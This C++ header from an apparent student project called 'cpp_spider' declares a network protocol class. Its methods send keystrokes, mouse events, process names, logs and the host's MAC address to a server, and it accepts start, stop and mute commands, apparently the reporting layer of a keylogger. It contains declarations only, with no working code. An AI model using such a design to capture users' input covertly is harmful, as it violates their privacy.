//
// Protocolv1.hpp for  in /home/bbr2394/renduTek3/cpp_spider/include
// 
// Made by Bertrand-Rapello Baptiste
// Login   <bertra_l@epitech.net>
// 
// Started on  Wed Oct 21 22:50:40 2015 Bertrand-Rapello Baptiste
// Last update Mon Oct 26 07:11:04 2015 Antoine Plaskowski
//

#ifndef		PROTOCOLV1_HPP_
# define	PROTOCOLV1_HPP_

# include	<string>
# include	<array>
# include	"IProtocol.hpp"
# include	"ITime.hpp"
# include	"Packetread.hpp"
# include	"Packetwrite.hpp"

class Protocolv1 : public IProtocol
{
private:
  enum	Errorcode : uint8_t
  {
    NO_ERROR = 0,
    IGNORED = 1,
    UNKNOWN_ERROR = 2,
    CLIENT_ALREADY_STARTED = 3,
    CLIENT_ALREADY_STOPPED = 4,
    CLIENT_ALREADY_MUTED = 5,
    CLIENT_ALREADY_UNMUTED = 6,
    INVALID_COMMAND = 7,
    INVALID_KEYBOARD_INPUT = 8,
    INVALID_MOUSE_INPUT = 9,
    UNKNOWN_ID = 10,
    WRONG_PROTOCOL_VERSION = 11,
    WRONG_MAC_ADDRESS = 12,
    CONNECT_FAIL = 13,
    DISCONNECT_FAIL = 14
  };
public:
  Protocolv1(ISocket &socket, ITime &time);
  ~Protocolv1(void);
private:
  Protocolv1(Protocolv1 const &source);
  Protocolv1	&operator=(Protocolv1 const &source);
public:
  bool	select(void) const;
  bool	run(IDatabase const &database, ITime const *timeout = nullptr);
  bool	server_command(Commandcode command);
  std::string const	&get_mac_address(void) const;
  bool	mac_address(std::string const &mac_address);
  bool	log(std::string const &log);
  bool	keyboard(ITime const &time,
		 std::string const &event,
		 std::string const &key,
		 std::string const &process);
  bool	mouse(ITime const &time,
	      uintmax_t x,
	      uintmax_t y,
	      uintmax_t amout,
	      std::string const &event,
	      std::string const &button,
	      std::string const &process);
  ISocket const	&get_isocket(void) const;
private:
  bool	read(IDatabase const &database);
  bool	write(void);
  bool	timeout(ITime const &timeout);
  bool	read_result(void);
  bool	write_result(Errorcode code, uint8_t id);
  bool	read_mac_address(void);
  bool	write_mac_address(std::string const &mac_address);
  bool	read_version(void);
  bool	write_version(void);
  bool	read_connect(void);
  bool	write_connect(void);
  bool	read_disconnect(void);
  bool	write_disconnect(void);
  bool	read_servercmd(void);
  bool	write_servercmd(Commandcode command);
  bool	read_clientlog(IDatabase const &database);
  bool	write_clientlog(std::string const &log);
  bool	read_ping(void);
  bool	write_ping(void);
  bool	read_pong(void);
  bool	write_pong(void);
  bool	read_keyboard(IDatabase const &database);
  bool	write_keyboard(ITime const &time,
		       std::string const &event,
		       std::string const &key,
		       std::string const &process);
  bool	read_mouse(IDatabase const &database);
  bool	write_mouse(ITime const &time,
		    uintmax_t x,
		    uintmax_t y,
		    uintmax_t amout,
		    std::string const &event,
		    std::string const &button,
		    std::string const &process);
  bool	write_packet(APacket::Opcode code);
private:
  ISocket	&m_socket;
  ITime	&m_last_read;
  std::string	m_mac_address;
  std::array<Packetwrite, UINT8_MAX>	m_packets;
  uint8_t	m_write;
  uint8_t	m_to_write;
  Packetread	m_read;
  bool	m_is_connect;
  bool	m_is_stop;
  bool	m_is_mute;
  bool	m_wait_pong;
};

#endif	/* !IPROTOCOLV1_HPP_ */
